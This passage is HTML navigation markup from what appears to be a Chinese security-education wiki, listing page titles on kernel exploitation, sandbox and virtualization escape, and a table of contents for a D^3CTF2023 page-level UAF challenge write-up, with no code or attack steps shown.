md-icon"></span> Aim </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../aim/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-3-2 type=checkbox id=nav-9-1-2-3-2> <label class=md-nav__link for=nav-9-1-2-3-2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-3-2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../aim/privilege-escalation/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../aim/privilege-escalation/change-self/ class=md-nav__link> Change Self </a> </li> <li class=md-nav__item> <a href=../../../../aim/privilege-escalation/change-others/ class=md-nav__link> Change Others </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../aim/info-leak/ class=md-nav__link> Information Disclosure </a> </li> <li class=md-nav__item> <a href=../../../../aim/dos/ class=md-nav__link> DoS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4 type=checkbox id=nav-9-1-2-4> <label class=md-nav__link for=nav-9-1-2-4> Defense <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Defense data-md-level=4> <label class=md-nav__title for=nav-9-1-2-4> <span class="md-nav__icon md-icon"></span> Defense </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../defense/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2 type=checkbox id=nav-9-1-2-4-2> <label class=md-nav__link for=nav-9-1-2-4-2> Isolation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Isolation data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-2> <span class="md-nav__icon md-icon"></span> Isolation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../defense/isolation/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2-2 type=checkbox id=nav-9-1-2-4-2-2> <label class=md-nav__link for=nav-9-1-2-4-2-2> User and Kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User and Kernel" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-4-2-2> <span class="md-nav__icon md-icon"></span> User and Kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../defense/isolation/user-kernel/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../defense/isolation/user-kernel/user-code-execution/ class=md-nav__link> 用户代码不可执行 </a> </li> <li class=md-nav__item> <a href=../../../../defense/isolation/user-kernel/user-data-access/ class=md-nav__link> 用户数据不可访问 </a> </li> <li class=md-nav__item> <a href=../../../../defense/isolation/user-kernel/kpti/ class=md-nav__link> KPTI - Kernel Page Table Isolation </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2-3 type=checkbox id=nav-9-1-2-4-2-3> <label class=md-nav__link for=nav-9-1-2-4-2-3> Inside Kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Inside Kernel" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-4-2-3> <span class="md-nav__icon md-icon"></span> Inside Kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../defense/isolation/inner-kernel/heap-chunk/ class=md-nav__link> 内部隔离 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-3 type=checkbox id=nav-9-1-2-4-3> <label class=md-nav__link for=nav-9-1-2-4-3> Access Control <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Access Control" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-3> <span class="md-nav__icon md-icon"></span> Access Control </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../defense/access-control/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../defense/access-control/information-disclosure/ class=md-nav__link> 信息泄漏 </a> </li> <li class=md-nav__item> <a href=../../../../defense/access-control/misc/ class=md-nav__link> Misc </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-4 type=checkbox id=nav-9-1-2-4-4> <label class=md-nav__link for=nav-9-1-2-4-4> Detection <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Detection data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-4> <span class="md-nav__icon md-icon"></span> Detection </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../defense/detection/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../defense/detection/canary/ class=md-nav__link> Kernel Stack Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-5 type=checkbox id=nav-9-1-2-4-5> <label class=md-nav__link for=nav-9-1-2-4-5> Randomization <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Randomization data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-5> <span class="md-nav__icon md-icon"></span> Randomization </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../defense/randomization/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../defense/randomization/kaslr/ class=md-nav__link> KASLR </a> </li> <li class=md-nav__item> <a href=../../../../defense/randomization/fgkaslr/ class=md-nav__link> FGKASLR </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5 type=checkbox id=nav-9-1-2-5 checked> <label class=md-nav__link for=nav-9-1-2-5> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-1-2-5> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../introduction/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-2 type=checkbox id=nav-9-1-2-5-2> <label class=md-nav__link for=nav-9-1-2-5-2> Returned Oriented Programming <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Returned Oriented Programming" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-2> <span class="md-nav__icon md-icon"></span> Returned Oriented Programming </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../rop/rop/ class=md-nav__link> Kernel ROP </a> </li> <li class=md-nav__item> <a href=../../../rop/kpti-bypass/ class=md-nav__link> Kernel ROP with KPTI bypass </a> </li> <li class=md-nav__item> <a href=../../../rop/ret2usr/ class=md-nav__link> ret2usr（已过时） </a> </li> <li class=md-nav__item> <a href=../../../rop/bypass-smep/ class=md-nav__link> bypass-smep （已过时） </a> </li> <li class=md-nav__item> <a href=../../../rop/ret2ptregs/ class=md-nav__link> 利用 pt_regs 构造通用内核 ROP </a> </li> <li class=md-nav__item> <a href=../../../rop/ret2dir/ class=md-nav__link> ret2dir </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-3 type=checkbox id=nav-9-1-2-5-3 checked> <label class=md-nav__link for=nav-9-1-2-5-3> Heap Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Heap Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-3> <span class="md-nav__icon md-icon"></span> Heap Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../heap_overview/ class=md-nav__link> 内核堆概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-3-2 type=checkbox id=nav-9-1-2-5-3-2> <label class=md-nav__link for=nav-9-1-2-5-3-2> slub allocator <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="slub allocator" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-5-3-2> <span class="md-nav__icon md-icon"></span> slub allocator </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../slub/introduction/ class=md-nav__link> 简介 </a> </li> <li class=md-nav__item> <a href=../../slub/uaf/ class=md-nav__link> kernel UAF </a> </li> <li class=md-nav__item> <a href=../../slub/spray/ class=md-nav__link> Heap Spray </a> </li> <li class=md-nav__item> <a href=../../slub/freelist/ class=md-nav__link> freelist 劫持 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-3-3 type=checkbox id=nav-9-1-2-5-3-3 checked> <label class=md-nav__link for=nav-9-1-2-5-3-3> Buddy System <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Buddy System" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-5-3-3> <span class="md-nav__icon md-icon"></span> Buddy System </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../cross-cache-overflow/ class=md-nav__link> Cross-Cache Overflow &amp; Page-level Heap Fengshui </a> </li> <li class=md-nav__item> <a href=../cross-cache-uaf/ class=md-nav__link> Cross-Cache UAF </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Page-level UAF <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Page-level UAF </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#d3ctf2023-d3kcache class=md-nav__link> 例题：D^3CTF2023 - d3kcache </a> <nav class=md-nav aria-label="例题：D^3CTF2023 - d3kcache"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 题目分析 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 漏洞利用 </a> <nav class=md-nav aria-label=漏洞利用> <ul class=md-nav__list> <li class=md-nav__item> <a href=#stepi- class=md-nav__link> Step.I - 页级堆风水构造稳定跨页溢出布局 </a> </li> <li class=md-nav__item> <a href=#stepii-fcntlf_setpipe_sz-pipe_buffer-slub-uaf class=md-nav__link> Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF </a> </li> <li class=md-nav__item> <a href=#stepiii- class=md-nav__link> Step.III - 构造二级自写管道，实现任意内存读写 </a> </li> <li class=md-nav__item> <a href=#stepiv- class=md-nav__link> Step.IV - 提权 </a> <nav class=md-nav aria-label="Step.IV - 提权"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#task_struct-cred-init_cred class=md-nav__link> 方法一、修改当前进程的 task_struct 的 cred 为 init_cred </a> </li> <li class=md-nav__item> <a href=#rop class=md-nav__link> 方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP </a> </li> <li class=md-nav__item> <a href=#usma class=md-nav__link> 方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#final-exploitation class=md-nav__link> Final Exploitation </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#reference class=md-nav__link> REFERENCE </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-4 type=checkbox id=nav-9-1-2-5-4> <label class=md-nav__link for=nav-9-1-2-5-4> Race Condition <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Race Condition" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-4> <span class="md-nav__icon md-icon"></span> Race Condition </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../race/double-fetch/ class=md-nav__link> Double Fetch </a> </li> <li class=md-nav__item> <a href=../../../race/userfaultfd/ class=md-nav__link> 用 userfaultfd 创造条件竞争 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-5 type=checkbox id=nav-9-1-2-5-5> <label class=md-nav__link for=nav-9-1-2-5-5> Tricks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tricks data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-5> <span class="md-nav__icon md-icon"></span> Tricks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tricks/initramfs/ class=md-nav__link> 在内存中直接搜索 flag </a> </li> <li class=md-nav__item> <a href=../../../tricks/qemu-monitor/ class=md-nav__link> 利用 QEMU Monitor 读取 flag </a> </li> <li class=md-nav__item> <a href=../../../tricks/writable-root/ class=md-nav__link> 直接改写根文件系统 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2 type=checkbox id=nav-9-2> <label class=md-nav__link for=nav-9-2> Windows Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Platform" data-md-level=2> <label class=md-nav__title for=nav-9-2> <span class="md-nav__icon md-icon"></span> Windows Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/readme/ class=md-nav__link> 概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2 type=checkbox id=nav-9-2-2> <label class=md-nav__link for=nav-9-2-2> User Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User Mode" data-md-level=3> <label class=md-nav__title for=nav-9-2-2> <span class="md-nav__icon md-icon"></span> User Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/readme/ class=md-nav__link> Readme </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2-2 type=checkbox id=nav-9-2-2-2> <label class=md-nav__link for=nav-9-2-2-2> 栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=栈溢出 data-md-level=4> <label class=md-nav__title for=nav-9-2-2-2> <span class="md-nav__icon md-icon"></span> 栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/stackoverflow/stack-introduction/ class=md-nav__link> 栈介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/stackoverflow/stackoverflow-basic/ class=md-nav__link> 栈溢出原理 </a> </li> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/stackoverflow/shellcode-in-stack/ class=md-nav__link> 执行 Shellcode </a> </li> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/stackoverflow/ret2dll/ class=md-nav__link> ret2dll利用 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-3 type=checkbox id=nav-9-2-3> <label class=md-nav__link for=nav-9-2-3> Kernel Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Kernel Mode" data-md-level=3> <label class=md-nav__title for=nav-9-2-3> <span class="md-nav__icon md-icon"></span> Kernel Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-3-1 type=checkbox id=nav-9-2-3-1> <label class=md-nav__link for=nav-9-2-3-1> Basic Knowledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basic Knowledge" data-md-level=4> <label class=md-nav__title for=nav-9-2-3-1> <span class="md-nav__icon md-icon"></span> Basic Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/kernel-mode/basic-knowledge/introduction/ class=md-nav__link> 基础知识 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-3 type=checkbox id=nav-9-3> <label class=md-nav__link for=nav-9-3> MacOS Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="MacOS Platform" data-md-level=2> <label class=md-nav__title for=nav-9-3> <span class="md-nav__icon md-icon"></span> MacOS Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../macos/readme/ class=md-nav__link> MacOS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-4 type=checkbox id=nav-9-4> <label class=md-nav__link for=nav-9-4> Misc OS Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Misc OS Platform" data-md-level=2> <label class=md-nav__title for=nav-9-4> <span class="md-nav__icon md-icon"></span> Misc OS Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc-os/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5 type=checkbox id=nav-9-5> <label class=md-nav__link for=nav-9-5> Sandbox Escape <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Sandbox Escape" data-md-level=2> <label class=md-nav__title for=nav-9-5> <span class="md-nav__icon md-icon"></span> Sandbox Escape </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-1 type=checkbox id=nav-9-5-1> <label class=md-nav__link for=nav-9-5-1> python <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=python data-md-level=3> <label class=md-nav__title for=nav-9-5-1> <span class="md-nav__icon md-icon"></span> python </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/python/python-sandbox-escape/ class=md-nav__link> Python 沙盒 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-2 type=checkbox id=nav-9-5-2> <label class=md-nav__link for=nav-9-5-2> shell <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=shell data-md-level=3> <label class=md-nav__title for=nav-9-5-2> <span class="md-nav__icon md-icon"></span> shell </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/shell/readme/ class=md-nav__link> Shell Sandbox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-3 type=checkbox id=nav-9-5-3> <label class=md-nav__link for=nav-9-5-3> seccomp <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=seccomp data-md-level=3> <label class=md-nav__title for=nav-9-5-3> <span class="md-nav__icon md-icon"></span> seccomp </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/seccomp/c-sandbox-escape/ class=md-nav__link> C 沙盒逃逸 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-4 type=checkbox id=nav-9-5-4> <label class=md-nav__link for=nav-9-5-4> namespace <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=namespace data-md-level=3> <label class=md-nav__title for=nav-9-5-4> <span class="md-nav__icon md-icon"></span> namespace </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/namespace/readme/ class=md-nav__link> Namespace </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-5 type=checkbox id=nav-9-5-5> <label class=md-nav__link for=nav-9-5-5> chroot <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=chroot data-md-level=3> <label class=md-nav__title for=nav-9-5-5> <span class="md-nav__icon md-icon"></span> chroot </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/chroot/readme/ class=md-nav__link> Chroot </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-6 type=checkbox id=nav-9-5-6> <label class=md-nav__link for=nav-9-5-6> docker <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=docker data-md-level=3> <label class=md-nav__title for=nav-9-5-6> <span class="md-nav__icon md-icon"></span> docker </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/docker/readme/ class=md-nav__link> Docker </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6 type=checkbox id=nav-9-6> <label class=md-nav__link for=nav-9-6> Virtualization <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Virtualization data-md-level=2> <label class=md-nav__title for=nav-9-6> <span class="md-nav__icon md-icon"></span> Virtualization </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-1 type=checkbox id=nav-9-6-1> <label class=md-nav__link for=nav-9-6-1> 基础知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础知识 data-md-level=3> <label class=md-nav__title for=nav-9-6-1> <span class="md-nav__icon md-icon"></span> 基础知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/basic-knowledge/basic-knowledge/ class=md-nav__link> 虚拟化技术简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/basic-knowledge/cpu-virtualization/ class=md-nav__link> CPU 虚拟化 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/basic-knowledge/mem-virtualization/ class=md-nav__link> 内存虚拟化 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/basic-knowledge/io-virtualization/ class=md-nav__link> IO 虚拟化 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2 type=checkbox id=nav-9-6-2> <label class=md-nav__link for=nav-9-6-2> QEMU <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=QEMU data-md-level=3> <label class=md-nav__title for=nav-9-6-2> <span class="md-nav__icon md-icon"></span> QEMU </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-1 type=checkbox id=nav-9-6-2-1> <label class=md-nav__link for=nav-9-6-2-1> 基础知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础知识 data-md-level=4> <label class=md-nav__title for=nav-9-6-2-1> <span class="md-nav__icon md-icon"></span> 基础知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/basic-knowledge/mm/ class=md-nav__link> QEMU 内存管理 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/basic-knowledge/dev/ class=md-nav__link> QEMU 设备模拟 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-2 type=checkbox id=nav-9-6-2-2> <label class=md-nav__link for=nav-9-6-2-2> 环境搭建 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=环境搭建 data-md-level=4> <label class=md-nav__title for=nav-9-6-2-2> <span class="md-nav__icon md-icon"></span> 环境搭建 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/environment/build-qemu/ class=md-nav__link> QEMU 下载与编译 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/environment/build-qemu-dev/ class=md-nav__link> 编写 QEMU 模拟设备 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-3 type=checkbox id=nav-9-6-2-3> <label class=md-nav__link for=nav-9-6-2-3> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-6-2-3> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/exploitation/intro/ class=md-nav__link> QEMU 逃逸入门 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-3-2 type=checkbox id=nav-9-6-2-3-2> <label class=md-nav__link for=nav-9-6-2-3-2> Tricks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tricks data-md-level=5> <label class=md-nav__title for=nav-9-6-2-3-2> <span class="md-nav__icon md-icon"></span> Tricks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/exploitation/tricks/qemu-monitor/ class=md-nav__link> 利用 QEMU Monitor 读取 flag </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-3 type=checkbox id=nav-9-6-3> <label class=md-nav__link for=nav-9-6-3> Virtual Box <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Virtual Box" data-md-level=3> <label class=md-nav__title for=nav-9-6-3> <span class="md-nav__icon md-icon"></span> Virtual Box </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/virtualbox/readme/ class=md-nav__link> VirtualBox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-4 type=checkbox id=nav-9-6-4> <label class=md-nav__link for=nav-9-6-4> VMWare <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=VMWare data-md-level=3> <label class=md-nav__title for=nav-9-6-4> <span class="md-nav__icon md-icon"></span> VMWare </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/vmware/readme/ class=md-nav__link> VMWare </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-5 type=checkbox id=nav-9-6-5> <label class=md-nav__link for=nav-9-6-5> Parallels <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Parallels data-md-level=3> <label class=md-nav__title for=nav-9-6-5> <span class="md-nav__icon md-icon"></span> Parallels </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/parallels/readmd/ class=md-nav__link> Parallels </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7 type=checkbox id=nav-9-7> <label class=md-nav__link for=nav-9-7> Browser <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Browser data-md-level=2> <label class=md-nav__title for=nav-9-7> <span class="md-nav__icon md-icon"></span> Browser </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-1 type=checkbox id=nav-9-7-1> <label class=md-nav__link for=nav-9-7-1> Chrome <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Chrome data-md-level=3> <label class=md-nav__title for=nav-9-7-1> <span class="md-nav__icon md-icon"></span> Chrome </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../browser/chrome/introduction/ class=md-nav__link> Chromium </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-1-2 type=checkbox id=nav-9-7-1-2> <label class=md-nav__link for=nav-9-7-1-2> V8 Engine <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="V8 Engine" data-md-level=4> <label class=md-nav__title for=nav-9-7-1-2> <span class="md-nav__icon md-icon"></span> V8 Engine </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a 